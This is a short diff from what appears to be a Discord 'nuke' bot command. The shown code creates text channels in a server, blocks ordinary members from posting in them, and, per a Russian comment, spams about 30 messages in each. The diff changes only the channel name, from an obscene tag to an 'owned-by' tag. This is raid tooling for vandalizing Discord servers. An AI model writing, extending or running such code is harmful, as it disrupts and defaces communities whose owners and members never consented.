@@ -26,7 +26,7 @@ async def nuke(ctx):
     
     async def create_and_spam(i):
         try:
-            ch = await guild.create_text_channel(f"fuck-by-nonerp")
+            ch = await guild.create_text_channel(f"owned-by-gvk-nl")
             await ch.set_permissions(guild.default_role, send_messages=False)
             
             # 30 сообщений (ускоренная отправка)
